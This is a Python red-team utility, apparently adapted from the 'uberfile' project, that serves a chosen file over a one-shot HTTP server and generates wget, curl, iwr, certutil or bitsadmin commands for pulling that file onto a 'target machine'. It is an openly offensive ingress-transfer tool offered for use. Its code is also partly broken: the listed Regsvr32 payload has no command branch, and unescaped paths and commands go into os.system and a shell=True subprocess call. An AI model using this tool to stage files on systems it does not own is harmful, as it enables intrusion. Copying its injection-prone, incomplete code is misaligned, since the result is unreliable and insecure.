#!/usr/bin/env python3

'''
Description :
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)
# Auteur : Frozenk / Christopher SIMON alias la reine des neiges
# Author: Amine B (en1ma - @_1mean)
# Author: ֆŋσσƥყ / Maxime Morin

Le script a été développé,Et il s'est avéré qu'un script très similaire, disponible sur (https://github.com/ShutdownRepo/uberfile),
existait déjà. Nous avons donc décidé de fusionner les meilleurs aspects des deux.

'''

import os
import socket
import argparse
import http.server
import socketserver
import subprocess
import netifaces as ni
import signal
import sys
import threading

from prompt_toolkit import prompt, PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.patch_stdout import patch_stdout
from simple_term_menu import TerminalMenu

def signal_handler(sig, frame):
    print('\nStopping the program ...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

class autocompletion(Completer):
    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        if text.startswith("~"):
            text = os.path.expanduser("~") + text[1:]
        if os.path.isdir(text):
            directory = text
            prefix = ""
        else:
            directory, prefix = os.path.split(text)
        suggestions = os.listdir(directory) if os.path.isdir(directory) else []
        matching = [os.path.join(directory, f) for f in suggestions if f.startswith(prefix)]
        matching = [f + ("/" if os.path.isdir(f) else "") for f in matching]
        for m in matching:
            yield Completion(m, start_position=-len(text), display=m)

def get_directory_input(prompt_text):
    completer = autocompletion()
    while True:
        path_input = prompt(prompt_text, completer=completer)
        if os.path.exists(path_input):
            if os.path.isdir(path_input):
                return path_input, True
            elif os.path.isfile(path_input):
                return path_input, False
        print("The specified path is not a valid directory or file. Please try again.")

def check_port_in_use(IPHOST, selected_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((IPHOST, selected_port))
        sock.close()
        return False
    except OSError:
        return True
    except PermissionError:
        print("Permission denied for port {}. Please enter a new port.".format(selected_port))
        return True

def OS_menu(os_arg=None, payload_arg=None):
    style = ("bg_black", "fg_yellow", "bold")
    if os_arg is None:
        target_OS = ["Linux", "Windows"]
        terminal_menu = TerminalMenu(target_OS, menu_cursor="=>  ", menu_highlight_style=style, title="What is the target OS?")
        menu_entry_index = terminal_menu.show()
        selected_os = target_OS[menu_entry_index]
    else:
        selected_os = os_arg

    if selected_os.lower() == "linux":
        payload_type = ["Wget", "Curl"]
    elif selected_os.lower() == "windows":
        payload_type = ["Iwr", "Certutil", "Wget", "Bitsadmin", "Regsvr32"]
    else:
        print("ERROR: Unsupported OS")
        sys.exit(1)

    if payload_arg is None:
        payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="Select a payload type:")
        payload_menu_entry_index = payload_menu.show()
        selected_payload = payload_type[payload_menu_entry_index]
    else:
        selected_payload = payload_arg

    return selected_os, selected_payload

def IP_menu(IPHOST, style):
    while True:
        ChoixPort = ["80", "8080", "8000", "443", "1234", "666", "Another port"]
        Port_menu = TerminalMenu(ChoixPort, menu_cursor="=>  ", menu_highlight_style=style, title="Select a port : ")
        Port_entry_index = Port_menu.show()
        if ChoixPort[Port_entry_index] == "Another port":
            selected_port = int(prompt("Please enter the port : "))
        else:
            selected_port = int(ChoixPort[Port_entry_index])

        if not check_port_in_use(IPHOST, selected_port):
            return selected_port
        else:
            print("The port {} is already in use. Please select another port.".format(selected_port))

def payload_requires_output(os_name: str, payload: str) -> bool:
    os_name = os_name.lower()
    payload = payload.lower()

    if os_name == "linux":
        return payload in ["curl"]

    if os_name == "windows":
        return payload in ["iwr", "certutil", "wget", "bitsadmin"]

    return False
def generate_download_command(OS, IPHOST, selected_file, selected_port, Payload, Output=None):
    base_url = f'http://{IPHOST}:{selected_port}/{os.path.basename(selected_file)}'
    if OS.lower() == "linux":
        if Payload == "Wget":
            command = f'wget {base_url}'
        elif Payload == "Curl":
            command = f'curl {base_url} -o {Output}'
    elif OS.lower() == "windows":
        if Payload == "Iwr":
            command = f'iwr {base_url} -OutFile {Output}'
        elif Payload == "Certutil":
            command = f'certutil -urlcache -split -f {base_url} {Output}'
        elif Payload == "Wget":
            command = f'wget {base_url} -OutFile {Output}'
        elif Payload == "Bitsadmin":
            command = f'bitsadmin /transfer myDownloadJob /download /priority normal {base_url} {Output}'
    return command

def start_http_server(selected_file, IPHOST, selected_port, download_command, Output):
    class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/' + os.path.basename(selected_file):
                try:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    with open(selected_file, 'rb') as file:
                        self.wfile.write(file.read())
                    print("File sent successfully.")
                    threading.Thread(target=self.server.shutdown).start()
                except IOError as e:
                    self.send_error(404, "File Not Found: %s" % self.path)
            else:
                self.send_error(404, "File Not Found: %s" % self.path)

    command_to_clip = download_command
    os.system(f"echo -n '{command_to_clip}' | xclip -selection clipboard")
    print(f"The command '{command_to_clip}' has been copied to your clipboard.")

    with socketserver.TCPServer((IPHOST, selected_port), CustomHTTPRequestHandler) as httpd:
        print(f"Server started at {IPHOST}:{selected_port}")
        httpd.selected_file = selected_file

        httpd.serve_forever()

        print('\nStopping the program ...')
        sys.exit(1)

def MenuGeneral(os_arg=None, file_arg=None, port_arg=None, payload_arg=None, Output_arg=None):
    style = ("bg_black", "fg_yellow", "bold")
    session = PromptSession()
    key_bindings = KeyBindings()

    class StepBack(Exception):
        pass

    @key_bindings.add('escape')
    def _(event):
        event.app.exit(result="__stepback__")

    step = 0
    OS = Payload = IPHOST = selected_file = selected_port = Output = None

    while True:
        try:
            if step <= 0:
                if os_arg:
                    OS = os_arg
                else:
                    os_menu = TerminalMenu(["Linux", "Windows"], menu_cursor="=>  ", menu_highlight_style=style, title="What is the target OS?")
                    os_index = os_menu.show()
                    if os_index is None:
                        continue
                    OS = ["Linux", "Windows"][os_index]

                if payload_arg:
                    Payload = payload_arg
                else:
                    if OS.lower() == "linux":
                        payload_type = ["Wget", "Curl"]
                    elif OS.lower() == "windows":
                        payload_type = ["Iwr", "Certutil", "Wget", "Bitsadmin", "Regsvr32"]
                    else:
                        continue

                    payload_menu = TerminalMenu(payload_type, menu_cursor="=>  ", menu_highlight_style=style, title="Select a payload type:")
                    payload_index = payload_menu.show()
                    if payload_index is None:
                        continue
                    Payload = payload_type[payload_index]

                step = 1

            if step <= 1:
                interfaces = ni.interfaces()
                ip_mappings = []
                for interface in interfaces:
                    ip_info = ni.ifaddresses(interface).get(ni.AF_INET)
                    if ip_info:
                        ip_address = ip_info[0]['addr']
                        ip_mappings.append(f"{interface} == {ip_address}")
                    else:
                        ip_mappings.append(f"{interface} == No IP")

                while True:
                    try:
                        ip_menu = TerminalMenu(ip_mappings, menu_cursor="=>  ", menu_highlight_style=style, title="Select a network interface:")
                        ip_entry_index = ip_menu.show()
                        if ip_entry_index is None:
                            step = 0
                            raise StepBack()
                        selected_interface = interfaces[ip_entry_index]
                        break
                    except KeyboardInterrupt:
                        sys.exit(0)
                    except StepBack:
                        step = 0
                        raise StepBack()

                IPHOST = ni.ifaddresses(selected_interface).get(ni.AF_INET)[0]['addr']
                step = 2

            if step <= 2:
                if file_arg is None:
                    try:
                        while True:
                            with patch_stdout():
                                selected_path = session.prompt("Enter the directory or file for selection: ", key_bindings=key_bindings, completer=autocompletion())
                                if selected_path == "__stepback__":
                                    step = 1
                                    raise StepBack()
                                selected_path = os.path.expanduser(selected_path)
                                if not os.path.exists(selected_path):
                                    print("Invalid path. Please try again.")
                                    continue
                                break
                        is_directory = os.path.isdir(selected_path)
                        selected_path = os.path.expanduser(selected_path)
                    except KeyboardInterrupt:
                        sys.exit(0)

                    if is_directory:
                        try:
                            selected_file = subprocess.check_output(f"cd {selected_path} && fzf", shell=True).decode().strip()
                            selected_file = os.path.join(selected_path, selected_file)
                        except subprocess.CalledProcessError:
                            sys.exit(0)
                    else:
                        selected_file = selected_path
                else:
                    selected_file = file_arg
                step = 3

            if step <= 3:
                if port_arg is None:
                    try:
                        while True:
                            choix_port = ["80", "8080", "8000", "443", "1234", "666", "Another port"]
                            port_menu = TerminalMenu(choix_port, menu_cursor="=>  ", menu_highlight_style=style, title="Select a port:")
                            port_index = port_menu.show()
                            if port_index is None:
                                step = 2
                                raise StepBack()
                            if choix_port[port_index] == "Another port":
                                try:
                                    with patch_stdout():
                                        selected_port_input = session.prompt("Please enter the port: ", key_bindings=key_bindings)
                                        if selected_port_input == "__stepback__":
                                            step = 2
                                            raise StepBack()
                                    try:
                                        selected_port = int(selected_port_input)
                                        if not 1 <= selected_port <= 65535:
                                            print("Port must be between 1 and 65535.")
                                            continue
                                    except ValueError:
                                        print("Invalid port. Please enter a numeric value.")
                                        continue
                                    break
                                except (KeyboardInterrupt, EOFError):
                                    sys.exit(0)
                            else:
                                selected_port = int(choix_port[port_index])
                            if not check_port_in_use(IPHOST, selected_port):
                                break
                            print(f"The port {selected_port} is already in use. Please select another port.")
                    except KeyboardInterrupt:
                        sys.exit(0)
                    except StepBack:
                        continue
                else:
                    selected_port = port_arg
                    if check_port_in_use(IPHOST, selected_port):
                        try:
                            print("The port {} is already in use. Please select another port.".format(selected_port))
                            selected_port = IP_menu(IPHOST, style)
                        except KeyboardInterrupt:
                            sys.exit(0)
                        except StepBack:
                            step = 2
                            raise StepBack()
                step = 4

            if step <= 4:
                def requires_output(os_name, payload):
                    return (os_name.lower(), payload.lower()) in {
                        ("linux", "curl"),
                        ("windows", "iwr"),
                        ("windows", "certutil"),
                        ("windows", "wget"),
                        ("windows", "bitsadmin")
                    }

                if requires_output(OS, Payload):
                    if Output_arg is None:
                        try:
                            with patch_stdout():
                                Output = session.prompt("Enter the filename to write on the target machine: ", key_bindings=key_bindings)
                                if Output == "__stepback__":
                                    step = 3
                                    raise StepBack()
                        except (KeyboardInterrupt, EOFError):
                            sys.exit(0)
                    else:
                        Output = Output_arg

            return OS, IPHOST, selected_file, selected_port, Payload, Output

        except StepBack:
            continue

def main():
    parser = argparse.ArgumentParser(description="Tool for quickly downloading files to a remote machine based on the target operating system. Launch the program and follow the prompts.")
    parser.add_argument("--port", "-p", type=int, help="Specify the port to use.")
    parser.add_argument("--os", "-os", type=str, help="Specify the target operating system. (Linux or Windows)")
    parser.add_argument("--file", "-f", type=str, help="Specify the upload file.")
    parser.add_argument("--output", "-o", type=str, help="File to write on the target machine.")
    parser.add_argument("--payload", "-py", type=str, help="Type of Payload.")
    args = parser.parse_args()

    OS, IPHOST, selected_file, selected_port, Payload, Output = MenuGeneral(args.os, args.file, args.port, args.payload, args.output)
    download_command = generate_download_command(OS, IPHOST, selected_file, selected_port, Payload, Output)
    start_http_server(selected_file, IPHOST, selected_port, download_command, Output)

if __name__ == "__main__":
    main()
